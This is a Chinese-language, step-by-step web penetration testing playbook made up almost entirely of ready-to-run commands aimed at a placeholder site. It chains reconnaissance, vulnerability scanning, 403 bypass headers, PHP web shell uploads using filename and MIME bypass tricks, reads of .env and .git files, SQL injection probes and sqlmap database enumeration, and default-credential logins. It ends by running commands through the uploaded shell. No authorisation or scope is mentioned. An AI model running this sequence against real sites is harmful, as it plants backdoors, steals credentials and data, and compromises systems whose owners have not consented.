━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔧 手动+工具混合渗透测试流程
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【核心原则】
直接手动调用工具，不写脚本
手动测试 + 工具扫描 + 手动验证

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 完整流程（手动执行）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【阶段1: 手动快速侦察（5分钟）】

1.1 基础信息收集
curl -skL -m 5 https://example.com -o /dev/null -w "HTTP状态: %{http_code}\n"
curl -skL -m 5 https://example.com | grep -iE '<title>|powered by'

1.2 技术栈识别（工具）
whatweb -a 3 https://example.com --log-json=whatweb.json

1.3 关键路径手动测试
curl -skL -m 3 https://example.com/admin -o /dev/null -w '%{http_code}\n'
curl -skL -m 3 https://example.com/wp-admin -o /dev/null -w '%{http_code}\n'
curl -skL -m 3 https://example.com/phpmyadmin -o /dev/null -w '%{http_code}\n'
curl -skL -m 3 https://example.com/upload -o /dev/null -w '%{http_code}\n'
curl -skL -m 3 https://example.com/api -o /dev/null -w '%{http_code}\n'
curl -skL -m 3 https://example.com/.env -o /dev/null -w '%{http_code}\n'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【阶段2: 工具批量扫描（10分钟）】

2.1 nuclei CVE扫描（工具）
nuclei -u https://example.com -t ~/nuclei-templates/cves/ -t ~/nuclei-templates/vulnerabilities/ -severity critical,high -o nuclei_cves.txt

2.2 ffuf目录爆破（工具）
ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403,401,500 -t 50 -o ffuf_dirs.json -of json

2.3 ffuf敏感文件爆破（工具）
echo -e '.env\nconfig.php\nwp-config.php\ndatabase.yml' > sensitive_files.txt
ffuf -u https://example.com/FUZZ -w sensitive_files.txt -mc 200 -t 20 -o ffuf_files.json -of json

2.4 WordPress专项（工具，如适用）
wpscan --url https://example.com --enumerate ap,at,u --no-update -o wpscan.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【阶段3: 手动验证+深入（15分钟）】

3.1 验证nuclei发现的漏洞（手动）
cat nuclei_cves.txt | head -5
# 手动测试每个漏洞URL

3.2 验证ffuf发现的403目录（手动绕过）
jq -r '.results[] | select(.status==403) | .url' ffuf_dirs.json | head -10
# 对每个403 URL手动测试绕过：
curl -skL -m 3 -H "X-Forwarded-For: 127.0.0.1" https://example.com/admin
curl -skL -m 3 -H "X-Original-URL: /admin" https://example.com/
curl -skL -m 3 -H "X-Rewrite-URL: /admin" https://example.com/

3.3 手动文件上传测试（16种绕过）
# 测试上传路径
curl -skL -m 5 -X POST https://example.com/upload -F "file=@shell.php"
curl -skL -m 5 -X POST https://example.com/fileupload -F "file=@shell.php"
curl -skL -m 5 -X POST https://example.com/api/upload -F "file=@shell.php"

# 16种绕过方法（手动逐个测试）
# 1. 双扩展名
echo '<?php system($_GET[0]); ?>' > shell.php.jpg
curl -skL -m 5 -X POST https://example.com/upload -F "file=@shell.php.jpg"

# 2. 大小写混淆
echo '<?php system($_GET[0]); ?>' > shell.PhP
curl -skL -m 5 -X POST https://example.com/upload -F "file=@shell.PhP"

# 3. 末尾点
echo '<?php system($_GET[0]); ?>' > shell.php.
curl -skL -m 5 -X POST https://example.com/upload -F "file=@shell.php."

# 4. 空字节注入
echo '<?php system($_GET[0]); ?>' > shell.php%00.jpg
curl -skL -m 5 -X POST https://example.com/upload -F "file=@shell.php%00.jpg"

# 5. MIME类型伪造
curl -skL -m 5 -X POST https://example.com/upload -F "file=@shell.php;type=image/jpeg"

3.4 手动敏感文件检查
curl -skL -m 3 https://example.com/.env
curl -skL -m 3 https://example.com/config.php
curl -skL -m 3 https://example.com/wp-config.php
curl -skL -m 3 https://example.com/.git/config

3.5 手动Git泄露检查
curl -skL -m 3 https://example.com/.git/config
curl -skL -m 3 https://example.com/.git/HEAD
curl -skL -m 3 https://example.com/.git/index

3.6 手动未授权API测试
curl -skL -m 3 https://example.com/api/users
curl -skL -m 3 https://example.com/api/data
curl -skL -m 3 https://example.com/api/admin
curl -skL -m 3 https://example.com/v1/users

3.7 手动SQL注入测试
curl -skL -m 3 "https://example.com/?id=1'"
curl -skL -m 3 "https://example.com/?id=1\""
curl -skL -m 3 "https://example.com/?id=1' AND '1'='1"
curl -skL -m 3 "https://example.com/?id=1' AND SLEEP(5)--"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【阶段4: 工具批量利用（10分钟）】

4.1 sqlmap SQL注入利用（工具）
sqlmap -u "https://example.com/?id=1" --batch --level=2 --risk=2 --tamper=space2comment --dbs

4.2 手动弱口令测试（精确检测）
# phpMyAdmin弱口令
curl -skL -m 5 -X POST https://example.com/phpmyadmin/index.php -d "pma_username=root&pma_password=root&server=1" -L -c /tmp/pmac
curl -skL -m 3 https://example.com/phpmyadmin/main.php -b /tmp/pmac | grep -qi "database" && echo "✅ 成功: root:root"

curl -skL -m 5 -X POST https://example.com/phpmyadmin/index.php -d "pma_username=admin&pma_password=admin&server=1" -L -c /tmp/pmac
curl -skL -m 3 https://example.com/phpmyadmin/main.php -b /tmp/pmac | grep -qi "database" && echo "✅ 成功: admin:admin"

# WordPress弱口令
curl -skL -m 5 -X POST https://example.com/wp-login.php -d "log=admin&pwd=admin&wp-submit=Log+In" -L -c /tmp/wpc
curl -skL -m 3 https://example.com/wp-admin -b /tmp/wpc | grep -qi "dashboard" && echo "✅ 成功: admin:admin"

# HTTP Basic认证弱口令
curl -skL -m 5 -u "admin:admin" https://example.com/admin -o /dev/null -w '%{http_code}\n'
curl -skL -m 5 -u "root:root" https://example.com/admin -o /dev/null -w '%{http_code}\n'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【阶段5: 手动最终确认（5分钟）】

5.1 汇总结果
cat nuclei_cves.txt
cat ffuf_dirs.json | jq '.results[] | select(.status==200)'
cat wpscan.txt

5.2 验证Shell
curl -skL -m 3 "https://example.com/uploads/shell.php?0=whoami"

5.3 验证凭证
curl -skL -m 3 https://example.com/phpmyadmin/main.php -b /tmp/pmac

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 工具清单（直接调用）
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

nuclei    - CVE漏洞扫描
ffuf      - 目录/文件爆破
sqlmap    - SQL注入利用
wpscan    - WordPress扫描
whatweb   - 技术栈识别
curl      - HTTP请求（手动）
jq        - JSON解析

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 最佳实践
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. 先手动快速侦察（识别技术栈、关键路径）
2. 工具批量扫描（nuclei CVE + ffuf目录）
3. 手动验证工具发现（重点测试403、验证漏洞）
4. 工具批量利用（sqlmap SQL注入）
5. 手动最终确认（验证Shell、凭证）
